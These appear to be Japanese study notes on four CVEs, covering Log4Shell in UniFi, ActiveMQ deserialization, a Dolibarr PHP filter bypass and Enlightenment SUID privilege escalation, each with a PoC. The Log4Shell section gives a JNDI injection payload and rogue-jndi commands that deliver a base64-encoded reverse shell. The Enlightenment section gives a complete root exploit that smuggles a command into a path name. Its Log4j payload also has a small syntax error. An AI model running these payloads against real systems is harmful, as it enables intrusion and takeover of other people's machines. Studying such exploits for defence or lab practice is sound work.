# CVE-2021-44228
Log4j2とはJavaアプリでログを効率的に記録するためのApacheが開発したオープンソースのライブラリ。  
Log4j2に搭載されていたLookup機能が悪用されたことが原因。  
Lookup機能の一つであるJNDI Lookupはログに特定の文字列`${...}`が含まれている場合、それを変数として評価し、外部リソースからデータを取得する機能。  
この機能が外部のLDAPへの参照を処理する場合に、外部から指定された任意のJavaオブジェクトのクラスファイルをダウンロードし、アプリ内で実行してしまう。

## PoC（Unifi 6.4.54のログインフォーム）
バージョン`6.5.53`以前が影響を受けていたため  
ログインフォームのリクエスト内にあるJSONオブジェクト、`remember`を使用。  
`"remember":"${jndi.ldap://<IP>:1389/o=tomcat}"`
```bash
# LDAPサーバーを起動し、悪意のあるJavaクラスを返すためにrogue-jndiを使用
git clone https://github.com/veracode-research/rogue-jndi
mvn package # Mavenでビルド
echo '<リバースシェル>' | base64 # リバースシェルをbase64エンコード
java -jar target/RogueJndi-1.1 --command "bash -c {echo,<Base64エンコードしたリバースシェル>}|{base64,-d}|{bash,-i}" --hostname <ターゲット>
# rogue-jndiで起動したLDAPサーバーへアクセスし、Javaクラスをダウンロードしてリバースシェルが実行される。
```

# CVE-2023-46604
Apache ActiveMQとはオープンソースのJavaベースのメッセージブローカー。  
Apache ActiveMQが使用するOpenWireプロトコルの処理方法に起因していて、メッセージ内のデータを十分に検証せずデシリアライズしてしまうことにより任意のクラスをロードしてRCEに繋がってしまう。

## PoC（ActiveMQ 5.15.5）
[https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)

## 影響バージョン
Apache ActiveMQ　5.18.0 ～ 5.18.2  
Apache ActiveMQ　5.17.0 ～ 5.17.5  
Apache ActiveMQ　5.16.0 ～ 5.16.6  
Apache ActiveMQ　～ 5.15.15

# CVE-2023-30253
Dolibarr ERP/CRM（バージョン17.0.0以下）に存在する脆弱性。Dolibarr ERP/CRMとは中小企業、フリーランサー、団体向けに設計されたオープンソースの統合ビジネス管理ソフトウェアである。  
DolibarrにはWebサイト作成機能があり、ユーザーはHTMLを入力できる。HTMLに埋め込みでphpコードを使用できないようにするフィルタが不適切であったため、RCEが可能となった。

## PoC (Dolibarr <= 17.0.0)
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

# CVE-2022-37706
X Window SystemおよびWayland向けの軽量で高機能なウィンドウマネージャであり、`enlightenment_sys`はUSBメモリを差し込んだ時に認識できるようにするもの。  
Enlightenment 0.25.4未満のバージョンにおける`enlightenment_sys`は、SUIDバイナリであるためローカルユーザーが特権を取得できる脆弱性を持ち、システムライブラリ関数が`/dev/..`という部分文字列で始まるパス名を適切に処理しない。それによりOSコマンドインジェクションが成立する。

## PoC
```bash
enlightenment --version # バージョン確認
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit" # プログラム実行時にOSは;の箇所で処理を区切るため、/tmp/exploit(/bin/sh)をsuidで実行させるための特殊なフォルダ名。
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit # 権限付与
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```
